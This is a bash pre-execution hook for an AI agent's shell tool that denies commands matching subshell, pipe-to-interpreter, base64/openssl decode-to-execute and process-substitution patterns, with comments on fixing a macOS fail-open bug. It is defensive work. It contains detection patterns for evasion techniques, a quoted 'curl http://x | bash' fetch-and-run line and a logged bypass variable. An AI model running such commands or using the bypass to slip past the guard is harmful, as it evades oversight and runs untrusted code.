#!/usr/bin/env bash
# tool-proxy-enforcer.sh — PreToolUse:Bash hook
# Status: active
# Description: Enforce tool-proxy sanitize layer at hook level — blocks subshell
#   injection and pipe-to-interpreter patterns not caught by guard-destructive.sh
#
# This closes the gap where agents call Bash directly without going through
# core/scripts/tool-proxy.sh (which is only enforced when explicitly invoked).
#
# Exit behaviour:
#   exit 0          — allow the command
#   JSON + exit 2   — block the command
#
# Bypass: YANA_TOOL_PROXY_BYPASS=1 (sovereign use only — logged)

set -uo pipefail

INPUT=$(cat)

# Extract command — try jq first, fallback to python3
if command -v jq >/dev/null 2>&1; then
  COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // ""')
else
  COMMAND=$(echo "$INPUT" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(d.get('tool_input',{}).get('command',''))" 2>/dev/null || true)
fi

[[ -z "$COMMAND" ]] && exit 0

deny() {
  local reason="$1"
  python3 -c "
import json, sys
print(json.dumps({
  'hookSpecificOutput': {
    'hookEventName': 'PreToolUse',
    'permissionDecision': 'deny',
    'permissionDecisionReason': sys.argv[1]
  }
}))" "$reason"
  exit 2
}

# Bypass — sovereign only. Deliberately checked BEFORE the python3-for-
# match_re dependency guard below (2026-07-19 fix — code-auditor review
# found the two in the wrong order: with the dependency check first, a
# missing python3 defeated the documented bypass outright, reproduced live.
# COMMAND extraction above only needs python3 as ITS OWN fallback when jq
# is absent — with jq present, COMMAND extraction, and therefore this
# bypass check, needs no python3 at all, so the dependency guard belongs
# strictly after this, scoped to what actually needs it: match_re()).
if [[ "${YANA_TOOL_PROXY_BYPASS:-0}" == "1" ]]; then
  LOG_FILE="${YANA_LOG:-/tmp/yana-ai-audit.log}"
  echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] TOOL-PROXY-BYPASS used cmd='$(echo "$COMMAND" | head -c 80)'" >> "$LOG_FILE" 2>/dev/null || true
  exit 0
fi

# Portable regex match via python3's `re` module (2026-07-19 fix — found via
# real testing on this repo's own macOS dev machine: every pattern check
# below used `grep -P`, a GNU-only PCRE extension. macOS's stock BSD grep
# does not support -P at all; it errors out with "invalid option -- P" for
# EVERY call, and that error was silently discarded — a failing grep counts
# as "no match" to the calling `if`, indistinguishable from a genuine
# non-match. This hook was therefore blocking NOTHING on macOS despite
# appearing to run cleanly, confirmed by a real end-to-end test that showed
# `curl http://x | bash` sailing through unblocked). None of the 5 patterns
# below use any actual PCRE-only feature (lookaheads/behinds, backrefs) —
# `\s`/`\b` are the only non-POSIX-ERE pieces, both handled natively by
# Python's `re`, so this switches to python3 rather than hand-porting each
# pattern to BSD-grep-compatible ERE (a second dialect to get subtly wrong).
#
# Fails CLOSED (deny) if python3 itself is missing — same precedent as
# guard-destructive.sh's missing-jq handling. This check is positioned
# AFTER the bypass check above on purpose (see that block's own comment):
# without python3, match_re() itself would silently error on every call,
# which bash's `if ... match_re ...; then` reads as "no match" — reopening
# the exact silent-fail-open bug this whole fix exists to close, just via a
# different missing binary. Checking here, right before the first call,
# converts that into an explicit deny instead.
if ! command -v python3 >/dev/null 2>&1; then
  cat <<'EOF'
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "Blocked: tool-proxy-enforcer.sh requires python3 (for portable pattern matching) but it is not installed. This fails closed so that subshell-injection/pipe-to-interpreter patterns cannot slip past a broken guard."
  }
}
EOF
  exit 2
fi

match_re() {
  local pattern="$1" ignorecase="${2:-0}"
  python3 -c "
import re, sys
flags = re.IGNORECASE if sys.argv[2] == '1' else 0
sys.exit(0 if re.search(sys.argv[1], sys.stdin.read(), flags) else 1)
" "$pattern" "$ignorecase"
}

# ── Subshell injection (tool-proxy sanitize phase 2a/2b) ─────────────────────
if echo "$COMMAND" | match_re '\$\(|`|<\(|\$\{'; then
  deny "[tool-proxy-enforcer] Blocked: subshell injection pattern detected (\$(), \`, <(), \${}). Use explicit commands instead of subshell substitution."
fi

# ── Pipe-to-interpreter (anti-evasion-law.md, tool-proxy phase 2d) ───────────
if echo "$COMMAND" | match_re '\|\s*(bash|sh|zsh|python3?|node|perl|ruby|php)\b' 1; then
  deny "[tool-proxy-enforcer] Blocked: pipe-to-interpreter detected. This is a TIER 1 security violation (anti-evasion-law.md). Never pipe content into a shell interpreter."
fi

# ── Base64 decode + pipe (anti-evasion pattern 2) ────────────────────────────
if echo "$COMMAND" | match_re 'base64\s+(--decode|-d).*\|' 1; then
  deny "[tool-proxy-enforcer] Blocked: base64 decode piped to command — encoded execution evasion (anti-evasion-law.md gate L1)."
fi

# ── Process substitution bypass ───────────────────────────────────────────────
if echo "$COMMAND" | match_re '(source|bash|sh)\s+<\(' 1; then
  deny "[tool-proxy-enforcer] Blocked: process substitution into interpreter (source <(...) / bash <(...)). Anti-evasion-law.md gate L1."
fi

# ── openssl decode + exec ─────────────────────────────────────────────────────
if echo "$COMMAND" | match_re 'openssl\s+(enc|base64).*-d.*\|' 1; then
  deny "[tool-proxy-enforcer] Blocked: openssl decode pipe — obfuscated execution evasion (anti-evasion-law.md)."
fi

exit 0
